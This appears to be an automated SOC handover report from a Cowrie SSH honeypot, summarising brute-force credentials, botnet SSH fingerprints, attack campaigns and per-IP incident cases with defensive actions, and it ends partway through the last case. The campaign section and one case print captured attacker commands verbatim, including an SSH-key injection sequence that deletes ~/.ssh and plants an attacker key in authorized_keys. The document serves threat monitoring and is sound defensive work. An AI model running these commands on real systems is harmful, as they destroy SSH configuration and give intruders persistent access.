# 🛡 THIR · SOC Shift Handover Report

| Field | Value |
|---|---|
| **Report Date** | 2026-07-26 |
| **Generated At** | 2026-07-26T15:10:44Z |
| **Shift Time** | 15:10 UTC |
| **Honeypot Status** | ✅ HEALTHY |
| **Source** | Cowrie SSH Honeypot · Oracle Cloud HA · Port 2222 |

---

## 📊 Executive Summary

| Metric | Value |
|---|---|
| Total Sessions Captured | **183** |
| Confirmed Threats | **162** |
| False Positives Filtered | **21** (11.5%) |
| Unique Attacker IPs | **79** |
| Countries of Origin | **30** |
| High Severity Cases | **55** |
| Medium Severity Cases | **0** |
| Low Severity Cases | **128** |
| Malware Samples Analyzed | **3** HIGH · **32** MED · 12 empty upload attempt(s) |

---

## 🔑 Credential Intelligence

| Metric | Value |
|---|---|
| Total Auth Attempts | **73** |
| Unique Credential Pairs | **32** |
| Unique Usernames | **14** |
| Unique Passwords | **26** |
| Successful Auth Pairs | **60** |

**Top Usernames:**

| Username | Attempts |
|---|---|
| `root` | 14 |
| `blank` | 12 |
| `admin` | 9 |
| `support` | 7 |
| `345gs5662d34` | 5 |

**Top Passwords:**

| Password | Attempts |
|---|---|
| `support` | 7 |
| `blank888` | 5 |
| `345gs5662d34` | 5 |
| `3245gs5662d34` | 5 |
| `22` | 5 |

**Top Credential Pairs:**

| Username | Password | Attempts |
|---|---|---|
| `support` | `support` | 7 |
| `blank` | `blank888` | 5 |
| `345gs5662d34` | `345gs5662d34` | 5 |
| `guest` | `22` | 5 |
| `centos` | `444` | 4 |

**⚠️ Successful Auth Pairs (Priority — cross-reference with IR cases):**

| Username | Password | Source IP | Timestamp |
|---|---|---|---|
| `support` | `support` | `176.53.159.196` | 2026-07-26T13:05:28 |
| `support` | `support` | `10.0.0.73` | 2026-07-26T13:05:45 |
| `unknown` | `44` | `14.99.61.248` | 2026-07-26T13:07:27 |
| `unknown` | `44` | `37.238.45.202` | 2026-07-26T13:07:35 |
| `centos` | `444` | `179.184.85.167` | 2026-07-26T13:18:41 |
| `centos` | `444` | `111.171.127.190` | 2026-07-26T13:18:50 |
| `centos` | `444` | `10.0.0.73` | 2026-07-26T13:19:03 |
| `operator` | `operator2024` | `14.54.22.11` | 2026-07-26T13:32:25 |
| `operator` | `operator2024` | `112.161.26.125` | 2026-07-26T13:32:38 |
| `blank` | `blank888` | `174.94.236.211` | 2026-07-26T13:35:21 |
| `operator` | `operator2024` | `10.0.0.73` | 2026-07-26T13:36:11 |
| `blank` | `blank888` | `191.36.154.175` | 2026-07-26T13:38:47 |
| `blank` | `blank888` | `182.79.218.101` | 2026-07-26T13:39:06 |
| `blank` | `blank888` | `10.0.0.73` | 2026-07-26T13:39:15 |
| `blank` | `66666` | `111.70.23.236` | 2026-07-26T13:40:17 |
| `blank` | `66666` | `146.255.228.189` | 2026-07-26T13:40:25 |
| `root` | `Ws123456` | `121.229.202.143` | 2026-07-26T13:42:08 |
| `345gs5662d34` | `345gs5662d34` | `121.229.202.143` | 2026-07-26T13:42:14 |
| `root` | `3245gs5662d34` | `121.229.202.143` | 2026-07-26T13:42:17 |
| `vpnuser` | `12345` | `163.7.6.41` | 2026-07-26T13:42:36 |
| `345gs5662d34` | `345gs5662d34` | `163.7.6.41` | 2026-07-26T13:42:40 |
| `vpnuser` | `3245gs5662d34` | `163.7.6.41` | 2026-07-26T13:42:42 |
| `blank` | `66666` | `10.0.0.73` | 2026-07-26T13:44:04 |
| `soporte` | `123456` | `85.24.223.224` | 2026-07-26T13:44:41 |
| `345gs5662d34` | `345gs5662d34` | `85.24.223.224` | 2026-07-26T13:44:44 |
| `soporte` | `3245gs5662d34` | `85.24.223.224` | 2026-07-26T13:44:46 |
| `admin` | `admin` | `120.48.22.219` | 2026-07-26T13:45:19 |
| `newuser` | `1234` | `159.65.224.88` | 2026-07-26T13:45:56 |
| `345gs5662d34` | `345gs5662d34` | `159.65.224.88` | 2026-07-26T13:45:57 |
| `newuser` | `3245gs5662d34` | `159.65.224.88` | 2026-07-26T13:45:57 |
| `guest` | `22` | `121.202.206.119` | 2026-07-26T13:57:28 |
| `root` | `123@@@` | `129.153.145.135` | 2026-07-26T13:58:06 |
| `root` | `LeitboGi0ro` | `129.153.145.135` | 2026-07-26T13:58:06 |
| `root` | `123@@@` | `64.110.90.250` | 2026-07-26T14:00:48 |
| `root` | `LeitboGi0ro` | `64.110.90.250` | 2026-07-26T14:00:48 |
| `guest` | `22` | `39.183.162.243` | 2026-07-26T14:00:51 |
| `root` | `roottest` | `4.247.209.15` | 2026-07-26T14:00:57 |
| `345gs5662d34` | `345gs5662d34` | `4.247.209.15` | 2026-07-26T14:01:00 |
| `root` | `3245gs5662d34` | `4.247.209.15` | 2026-07-26T14:01:02 |
| `guest` | `22` | `218.21.241.50` | 2026-07-26T14:01:05 |
| `guest` | `22` | `10.0.0.73` | 2026-07-26T14:01:06 |
| `admin` | `00` | `220.80.223.144` | 2026-07-26T14:03:41 |
| `admin` | `00` | `95.79.108.51` | 2026-07-26T14:03:48 |
| `admin` | `666` | `186.103.136.43` | 2026-07-26T14:08:16 |
| `admin` | `666` | `180.76.52.146` | 2026-07-26T14:08:24 |
| `admin` | `666` | `10.0.0.73` | 2026-07-26T14:08:40 |
| `root` | `` | `94.154.43.210` | 2026-07-26T14:18:47 |
| `blank` | `11111` | `188.43.204.45` | 2026-07-26T14:24:59 |
| `default` | `4444444` | `207.219.221.101` | 2026-07-26T14:25:18 |
| `default` | `4444444` | `10.0.0.73` | 2026-07-26T14:25:45 |
| `nobody` | `default` | `49.124.151.40` | 2026-07-26T14:29:42 |
| `nobody` | `default` | `113.108.88.121` | 2026-07-26T14:33:09 |
| `root` | `123` | `80.94.92.179` | 2026-07-26T14:38:51 |
| `admin` | `admin` | `10.0.0.73` | 2026-07-26T14:39:03 |
| `admin` | `admin` | `195.178.110.137` | 2026-07-26T14:40:38 |
| `root` | `1234` | `80.94.92.179` | 2026-07-26T14:42:50 |
| `root` | `12345` | `80.94.92.179` | 2026-07-26T14:46:28 |
| `blank` | `0000` | `181.212.174.166` | 2026-07-26T14:46:45 |
| `blank` | `0000` | `109.233.21.109` | 2026-07-26T14:50:12 |
| `root` | `1234567` | `80.94.92.179` | 2026-07-26T14:53:04 |

---

## 🖥 SSH Fingerprint Intelligence

| Metric | Value |
|---|---|
| Total Sessions Parsed | **183** |
| Sessions with Fingerprint | **10** |
| Unique HASSH Fingerprints | **10** |

**Client Family Distribution:**

| Client Family | Sessions |
|---|---|
| Unknown | 61 |
| OpenSSH | 34 |
| libssh | 15 |
| Go SSH scanner | 14 |
| Paramiko (Python) | 4 |

**⚠️ Botnet/Scanner KEX Signatures Detected:**

| HASSH | Signature | Sessions | IPs |
|---|---|---|---|
| `195e6691752c...` | Mirai/variant | 61 | 1 |
| `acaa53e0a7d7...` | Mirai/variant | 25 | 25 |
| `f555226df196...` | Mirai/variant | 15 | 5 |
| `2ec37a7cc8da...` | Mirai/variant | 5 | 1 |
| `eff4c24daffc...` | Modern SSH client | 4 | 1 |

**Top Fingerprints:**

| HASSH | Client | Sessions | IPs | Botnet Sig |
|---|---|---|---|---|
| `195e6691752c...` | Unknown | 61 | 1 | Mirai/variant |
| `acaa53e0a7d7...` | OpenSSH | 25 | 25 | Mirai/variant |
| `f555226df196...` | libssh | 15 | 5 | Mirai/variant |
| `95420f9d932d...` | OpenSSH | 9 | 4 | — |
| `2ec37a7cc8da...` | Go SSH scanner | 5 | 1 | Mirai/variant |
| `eff4c24daffc...` | Go SSH scanner | 4 | 1 | Modern SSH client |
| `a2de0f306611...` | Paramiko (Python) | 4 | 2 | Mirai/variant |
| `e54ef3ec27fe...` | Go SSH scanner | 3 | 2 | Generic scanner |

---

## ⚔️ Attack Campaign Intelligence

| Metric | Value |
|---|---|
| Total Command Clusters | **3** |
| Campaign Clusters | **3** |
| Highest Severity | **HIGH** |

**Active Campaigns:**

| Campaign | Severity | Sessions | IPs | TTPs |
|---|---|---|---|---|
| **Recon Loader Script** | 🟡 MEDIUM | 4 | 1 | `T1082, T1592, T1078, T1083` |
| **Mirai/IoT Botnet** | 🔴 HIGH | 1 | 1 | `T1082, T1105, T1059.004` |
| **mdrfckr SSH Key Injection** | 🔴 HIGH | 5 | 5 | `T1021.004, T1078, T1070, T1140` |

**🟡 MEDIUM · Recon Loader Script**

> Multi-stage recon script. Exports PATH, fingerprints host, returns data to C2 loader.

Representative commands:
```
export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una
```
```
uname -s -v -n -m 2 > /dev/null
```
```
/bin/uname -s -v -n -m 2 > /dev/null
```
```
/usr/bin/uname -s -v -n -m 2 > /dev/null
```
```
busybox uname -s -v -n -m 2 > /dev/null
```
Source IPs: `80.94.92.179`

**🔴 HIGH · Mirai/IoT Botnet**

> Mirai-family IoT botnet. Executes busybox payloads for DDoS bot recruitment.

Representative commands:
```
echo SHELL_TEST
```
```
/bin/busybox TEST
```
```
cat /proc
```
```
./
```
Source IPs: `94.154.43.210`

**🔴 HIGH · mdrfckr SSH Key Injection**

> Backdoor SSH key injection campaign. Wipes existing authorized_keys and injects attacker public key.

Representative commands:
```
cd ~; chattr -ia .ssh; lockr -ia .ssh
```
```
cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~
```
Source IPs: `159.65.224.88`, `85.24.223.224`, `121.229.202.143`, `4.247.209.15`, `163.7.6.41`

---

## 🌐 ASN Cluster Intelligence

| Metric | Value |
|---|---|
| Total IPs Analysed | **79** |
| Unique ASNs | **60** |
| High-Risk ASNs | **47** |
| Anon Infrastructure ASNs | **0** |

**Top Attack ASNs:**

| ASN | Provider | IPs | Risk |
|---|---|---|---|
| `AS46562` | Performive LLC | 6 | MEDIUM |
| `AS4766` | Korea Telecom | 4 | HIGH |
| `AS8075` | Microsoft Corporation | 3 | HIGH |
| `AS4134` | CHINANET BACKBONE | 3 | HIGH |
| `AS22773` | Cox Communications Inc. | 3 | MEDIUM |
| `AS63949` | Akamai Connected Cloud | 2 | HIGH |
| `AS38365` | Beijing Baidu Netcom Science and Technology Co., Ltd. | 2 | HIGH |
| `AS31898` | Oracle Corporation | 2 | HIGH |

---

---

## 🚨 Priority Cases — Immediate Attention (55)

> Cases with auth success, command execution, or file downloads.
> Each requires individual review. Never grouped.

### 🔴 HIGH · IR-17df3a3b2b0a

| Field | Detail |
|---|---|
| **Source IP** | `176.53.159[.]196` |
| **First Seen** | 2026-07-26 13:05 |
| **Last Seen** | 2026-07-26 13:05 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-26 13:05:28` | `cowrie.session.connect` |
| `2026-07-26 13:05:28` | `cowrie.client.version` |
| `2026-07-26 13:05:28` | `cowrie.client.kex` |
| `2026-07-26 13:05:28` | `cowrie.login.success` |
| `2026-07-26 13:05:28` | `cowrie.direct-tcpip.request` |
| `2026-07-26 13:05:28` | `cowrie.direct-tcpip.data` |
| `2026-07-26 13:05:28` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `176.53.159[.]196` to AbuseIPDB if not already reported
- [ ] Block `176.53.159[.]196` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-c523a990704a

| Field | Detail |
|---|---|
| **Source IP** | `14.99.61[.]248` |
| **First Seen** | 2026-07-26 13:07 |
| **Last Seen** | 2026-07-26 13:07 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-26 13:07:25` | `cowrie.session.connect` |
| `2026-07-26 13:07:25` | `cowrie.client.version` |
| `2026-07-26 13:07:25` | `cowrie.client.kex` |
| `2026-07-26 13:07:27` | `cowrie.login.success` |
| `2026-07-26 13:07:27` | `cowrie.direct-tcpip.request` |
| `2026-07-26 13:07:32` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `14.99.61[.]248` to AbuseIPDB if not already reported
- [ ] Block `14.99.61[.]248` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-a08c91738f92

| Field | Detail |
|---|---|
| **Source IP** | `37.238.45[.]202` |
| **First Seen** | 2026-07-26 13:07 |
| **Last Seen** | 2026-07-26 13:07 |
| **Session Duration** | 6s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-26 13:07:33` | `cowrie.session.connect` |
| `2026-07-26 13:07:33` | `cowrie.client.version` |
| `2026-07-26 13:07:33` | `cowrie.client.kex` |
| `2026-07-26 13:07:35` | `cowrie.login.success` |
| `2026-07-26 13:07:35` | `cowrie.direct-tcpip.request` |
| `2026-07-26 13:07:39` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `37.238.45[.]202` to AbuseIPDB if not already reported
- [ ] Block `37.238.45[.]202` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-b4e7370a39ad

| Field | Detail |
|---|---|
| **Source IP** | `179.184.85[.]167` |
| **First Seen** | 2026-07-26 13:18 |
| **Last Seen** | 2026-07-26 13:18 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-26 13:18:39` | `cowrie.session.connect` |
| `2026-07-26 13:18:39` | `cowrie.client.version` |
| `2026-07-26 13:18:39` | `cowrie.client.kex` |
| `2026-07-26 13:18:41` | `cowrie.login.success` |
| `2026-07-26 13:18:42` | `cowrie.direct-tcpip.request` |
| `2026-07-26 13:18:47` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `179.184.85[.]167` to AbuseIPDB if not already reported
- [ ] Block `179.184.85[.]167` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-daae23e00fe5

| Field | Detail |
|---|---|
| **Source IP** | `111.171.127[.]190` |
| **First Seen** | 2026-07-26 13:18 |
| **Last Seen** | 2026-07-26 13:18 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-26 13:18:47` | `cowrie.session.connect` |
| `2026-07-26 13:18:48` | `cowrie.client.version` |
| `2026-07-26 13:18:48` | `cowrie.client.kex` |
| `2026-07-26 13:18:50` | `cowrie.login.success` |
| `2026-07-26 13:18:51` | `cowrie.direct-tcpip.request` |
| `2026-07-26 13:18:56` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `111.171.127[.]190` to AbuseIPDB if not already reported
- [ ] Block `111.171.127[.]190` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-0b04076ff94b

| Field | Detail |
|---|---|
| **Source IP** | `176.53.159[.]196` |
| **First Seen** | 2026-07-26 13:28 |
| **Last Seen** | 2026-07-26 13:28 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-26 13:28:39` | `cowrie.session.connect` |
| `2026-07-26 13:28:39` | `cowrie.client.version` |
| `2026-07-26 13:28:39` | `cowrie.client.kex` |
| `2026-07-26 13:28:39` | `cowrie.login.success` |
| `2026-07-26 13:28:39` | `cowrie.direct-tcpip.request` |
| `2026-07-26 13:28:39` | `cowrie.direct-tcpip.data` |
| `2026-07-26 13:28:39` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `176.53.159[.]196` to AbuseIPDB if not already reported
- [ ] Block `176.53.159[.]196` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-deff0ede079a

| Field | Detail |
|---|---|
| **Source IP** | `14.54.22[.]11` |
| **First Seen** | 2026-07-26 13:32 |
| **Last Seen** | 2026-07-26 13:32 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-26 13:32:22` | `cowrie.session.connect` |
| `2026-07-26 13:32:23` | `cowrie.client.version` |
| `2026-07-26 13:32:23` | `cowrie.client.kex` |
| `2026-07-26 13:32:25` | `cowrie.login.success` |
| `2026-07-26 13:32:26` | `cowrie.direct-tcpip.request` |
| `2026-07-26 13:32:30` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `14.54.22[.]11` to AbuseIPDB if not already reported
- [ ] Block `14.54.22[.]11` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-83bcfc42bc06

| Field | Detail |
|---|---|
| **Source IP** | `112.161.26[.]125` |
| **First Seen** | 2026-07-26 13:32 |
| **Last Seen** | 2026-07-26 13:32 |
| **Session Duration** | 9s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-26 13:32:35` | `cowrie.session.connect` |
| `2026-07-26 13:32:36` | `cowrie.client.version` |
| `2026-07-26 13:32:36` | `cowrie.client.kex` |
| `2026-07-26 13:32:38` | `cowrie.login.success` |
| `2026-07-26 13:32:39` | `cowrie.direct-tcpip.request` |
| `2026-07-26 13:32:44` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `112.161.26[.]125` to AbuseIPDB if not already reported
- [ ] Block `112.161.26[.]125` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-64ff89396456

| Field | Detail |
|---|---|
| **Source IP** | `174.94.236[.]211` |
| **First Seen** | 2026-07-26 13:35 |
| **Last Seen** | 2026-07-26 13:35 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-26 13:35:19` | `cowrie.session.connect` |
| `2026-07-26 13:35:19` | `cowrie.client.version` |
| `2026-07-26 13:35:19` | `cowrie.client.kex` |
| `2026-07-26 13:35:21` | `cowrie.login.success` |
| `2026-07-26 13:35:21` | `cowrie.direct-tcpip.request` |
| `2026-07-26 13:35:26` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `174.94.236[.]211` to AbuseIPDB if not already reported
- [ ] Block `174.94.236[.]211` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-39ea9a048f8c

| Field | Detail |
|---|---|
| **Source IP** | `191.36.154[.]175` |
| **First Seen** | 2026-07-26 13:38 |
| **Last Seen** | 2026-07-26 13:43 |
| **Session Duration** | 302s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-26 13:38:44` | `cowrie.session.connect` |
| `2026-07-26 13:38:45` | `cowrie.client.version` |
| `2026-07-26 13:38:45` | `cowrie.client.kex` |
| `2026-07-26 13:38:47` | `cowrie.login.success` |
| `2026-07-26 13:38:47` | `cowrie.direct-tcpip.request` |
| `2026-07-26 13:43:47` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `191.36.154[.]175` to AbuseIPDB if not already reported
- [ ] Block `191.36.154[.]175` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-a96b8ec4025d

| Field | Detail |
|---|---|
| **Source IP** | `182.79.218[.]101` |
| **First Seen** | 2026-07-26 13:38 |
| **Last Seen** | 2026-07-26 13:39 |
| **Session Duration** | 13s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-26 13:38:57` | `cowrie.session.connect` |
| `2026-07-26 13:39:00` | `cowrie.client.version` |
| `2026-07-26 13:39:01` | `cowrie.client.kex` |
| `2026-07-26 13:39:06` | `cowrie.login.success` |
| `2026-07-26 13:39:10` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `182.79.218[.]101` to AbuseIPDB if not already reported
- [ ] Block `182.79.218[.]101` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-8d762c00eec7

| Field | Detail |
|---|---|
| **Source IP** | `176.53.159[.]196` |
| **First Seen** | 2026-07-26 13:39 |
| **Last Seen** | 2026-07-26 13:39 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-26 13:39:32` | `cowrie.session.connect` |
| `2026-07-26 13:39:32` | `cowrie.client.version` |
| `2026-07-26 13:39:32` | `cowrie.client.kex` |
| `2026-07-26 13:39:32` | `cowrie.login.success` |
| `2026-07-26 13:39:32` | `cowrie.direct-tcpip.request` |
| `2026-07-26 13:39:32` | `cowrie.direct-tcpip.data` |
| `2026-07-26 13:39:33` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `176.53.159[.]196` to AbuseIPDB if not already reported
- [ ] Block `176.53.159[.]196` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-a85fa7811d7f

| Field | Detail |
|---|---|
| **Source IP** | `111.70.23[.]236` |
| **First Seen** | 2026-07-26 13:40 |
| **Last Seen** | 2026-07-26 13:40 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-26 13:40:15` | `cowrie.session.connect` |
| `2026-07-26 13:40:15` | `cowrie.client.version` |
| `2026-07-26 13:40:15` | `cowrie.client.kex` |
| `2026-07-26 13:40:17` | `cowrie.login.success` |
| `2026-07-26 13:40:18` | `cowrie.direct-tcpip.request` |
| `2026-07-26 13:40:23` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `111.70.23[.]236` to AbuseIPDB if not already reported
- [ ] Block `111.70.23[.]236` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-40406074e153

| Field | Detail |
|---|---|
| **Source IP** | `146.255.228[.]189` |
| **First Seen** | 2026-07-26 13:40 |
| **Last Seen** | 2026-07-26 13:40 |
| **Session Duration** | 6s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-26 13:40:23` | `cowrie.session.connect` |
| `2026-07-26 13:40:24` | `cowrie.client.version` |
| `2026-07-26 13:40:24` | `cowrie.client.kex` |
| `2026-07-26 13:40:25` | `cowrie.login.success` |
| `2026-07-26 13:40:25` | `cowrie.direct-tcpip.request` |
| `2026-07-26 13:40:29` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `146.255.228[.]189` to AbuseIPDB if not already reported
- [ ] Block `146.255.228[.]189` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-9c6f0792b687

| Field | Detail |
|---|---|
| **Source IP** | `121.229.202[.]143` |
| **First Seen** | 2026-07-26 13:42 |
| **Last Seen** | 2026-07-26 13:42 |
| **Session Duration** | 10s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-26 13:42:07` | `cowrie.session.connect` |
| `2026-07-26 13:42:07` | `cowrie.client.version` |
| `2026-07-26 13:42:07` | `cowrie.client.kex` |
| `2026-07-26 13:42:08` | `cowrie.login.success` |
| `2026-07-26 13:42:09` | `cowrie.session.params` |
| `2026-07-26 13:42:09` | `cowrie.command.input` |
| `2026-07-26 13:42:09` | `cowrie.command.failed` |
